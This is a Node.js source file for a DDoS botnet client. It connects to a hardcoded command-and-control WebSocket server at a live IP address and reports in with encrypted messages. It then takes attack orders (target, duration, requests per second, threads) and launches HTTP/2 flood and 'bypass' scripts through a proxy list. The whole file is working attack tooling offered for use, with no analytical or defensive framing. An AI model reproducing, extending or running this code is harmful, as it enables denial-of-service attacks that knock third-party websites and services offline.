const websocket = require('ws');
const { spawn } = require('child_process');
const ENC = require('./Encryption');

const Proxys = 'Actions/proxies.txt';
const RR = 'Actions/CyberRapidHTTP2.js';
const Bypass = 'Actions/CyberBypassHTTP2.js';
const SocketServer = new websocket('ws://45.140.188.196:8080');

SocketServer.on('open', function open() 
{
    SocketServer.send(ENC.Encrypt('Bot Connected to Socket!!!'));
});


SocketServer.on('message', function incoming(message) 
{
    const received = ENC.Decrypt(message.toString());
    if (received.includes('|')) 
    {
        const Data = received.split('|');
        SocketServer.send(ENC.Encrypt('Bot Joined Attack!!!'));
        Start(Data[0], Data[1], Data[2], Data[3], Data[4], Data[5]);
    }
    else 
    {
        console.log(received);
    }
});

SocketServer.on('error', function error(error) 
{
    console.error('WebSocket error:', error);
});

function Start(Target, Time, RPS, Type, Threads, Is_RR) 
{
  switch (Is_RR) 
  {
    case '0':
        spawn('node', [Bypass, Target, Time, RPS, Type, Threads, Proxys]);
        break;
    case '1':
        spawn('node', [RR, Target, Time, RPS, Threads, Proxys]);
        break;
  }
}